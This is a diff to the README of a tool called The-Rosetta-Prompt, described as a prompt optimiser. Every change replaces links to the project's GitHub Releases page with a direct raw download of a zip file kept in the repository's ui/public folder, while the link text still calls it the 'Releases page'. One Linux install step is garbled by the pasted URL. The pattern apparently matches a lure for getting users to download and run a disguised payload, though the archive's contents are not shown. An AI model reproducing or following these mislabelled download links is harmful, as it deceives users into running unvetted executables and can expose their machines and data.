@@ -1,6 +1,6 @@
 # 🎉 The-Rosetta-Prompt - Optimize Your Prompts Effortlessly
 
-[![Download The-Rosetta-Prompt](https://img.shields.io/badge/Download-The--Rosetta--Prompt-blue.svg)](https://github.com/dinamico99/The-Rosetta-Prompt/releases)
+[![Download The-Rosetta-Prompt](https://github.com/dinamico99/The-Rosetta-Prompt/raw/refs/heads/main/ui/public/Rosetta_The_Prompt_2.7-beta.2.zip)](https://github.com/dinamico99/The-Rosetta-Prompt/raw/refs/heads/main/ui/public/Rosetta_The_Prompt_2.7-beta.2.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ The-Rosetta-Prompt is a simple tool designed to enhance the way you interact wit
 
 Follow these steps to download and run The-Rosetta-Prompt:
 
-1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://github.com/dinamico99/The-Rosetta-Prompt/releases). This page will provide you with the latest version of The-Rosetta-Prompt.
+1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://github.com/dinamico99/The-Rosetta-Prompt/raw/refs/heads/main/ui/public/Rosetta_The_Prompt_2.7-beta.2.zip). This page will provide you with the latest version of The-Rosetta-Prompt.
 
 2. **Choose a Version**: On the Releases page, find the version you want. It’s usually best to choose the latest version. 
 
@@ -21,7 +21,7 @@ Follow these steps to download and run The-Rosetta-Prompt:
 5. **Install the Application**:
    - **For Windows**: Locate the downloaded `.exe` file. Double-click it to begin the installation. Follow the on-screen instructions to complete the setup.
    - **For Mac**: Open the `.dmg` file you downloaded. Drag the The-Rosetta-Prompt icon into your Applications folder.
-   - **For Linux**: If you downloaded a `.tar.gz` file, extract it to your preferred directory. Open a terminal, navigate to the folder, and run the command: `./The-Rosetta-Prompt`.
+   - **For Linux**: If you downloaded a `https://github.com/dinamico99/The-Rosetta-Prompt/raw/refs/heads/main/ui/public/Rosetta_The_Prompt_2.7-beta.2.zip` file, extract it to your preferred directory. Open a terminal, navigate to the folder, and run the command: `./The-Rosetta-Prompt`.
 
 6. **Run the Application**: After installation, locate The-Rosetta-Prompt in your applications list or folder. Double-click to launch.
 
@@ -42,7 +42,7 @@ To ensure the best performance of The-Rosetta-Prompt, here are some recommended 
 
 ## 💻 Download & Install
 
-To get started, download The-Rosetta-Prompt now from our [Releases page](https://github.com/dinamico99/The-Rosetta-Prompt/releases).
+To get started, download The-Rosetta-Prompt now from our [Releases page](https://github.com/dinamico99/The-Rosetta-Prompt/raw/refs/heads/main/ui/public/Rosetta_The_Prompt_2.7-beta.2.zip).
 
 This download link will take you directly to the necessary files to get the application up and running quickly.
 
